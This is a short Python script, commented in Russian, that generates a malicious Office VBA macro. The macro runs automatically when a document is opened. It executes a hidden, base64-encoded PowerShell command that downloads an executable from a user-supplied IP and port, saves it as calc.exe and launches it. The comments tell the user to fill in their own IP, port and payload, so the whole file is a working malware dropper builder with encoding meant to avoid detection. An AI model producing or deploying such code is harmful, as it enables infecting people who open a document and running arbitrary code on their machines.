import base64

# PowerShell команда для скачивания файла и его запуска
# Укажите свой IP,PORT,PAYLOAD
payload = """
$client = New-Object System.Net.WebClient
$client.DownloadFile('http://<IP>:<PORT>/<PAYLOAD>.exe', 'C:\\Users\\Public\\Documents\\calc.exe')
Start-Process 'C:\\Users\\Public\\Documents\\calc.exe' -WindowStyle Hidden
"""

# Кодирование payload в base64
encoded_payload = base64.b64encode(payload.encode('utf16')[2:]).decode()
cmdline = "powershell.exe -nop -w hidden -e " + encoded_payload

# Создание макроса для Microsoft Office
macro_payload = """
Sub AutoOpen()
    AutoOpenMacro
End Sub

Sub Document_Open()
    AutoOpenMacro
End Sub

Sub AutoOpenMacro()
    Dim Str as String
"""

for i in range(0, len(cmdline), 50):
    macro_payload = macro_payload + "    Str = Str + " + '"' + cmdline[i:i + 50] + '"\n'

macro_payload = macro_payload + """
    CreateObject("Wscript.Shell").Run Str
End Sub
"""

print(macro_payload)
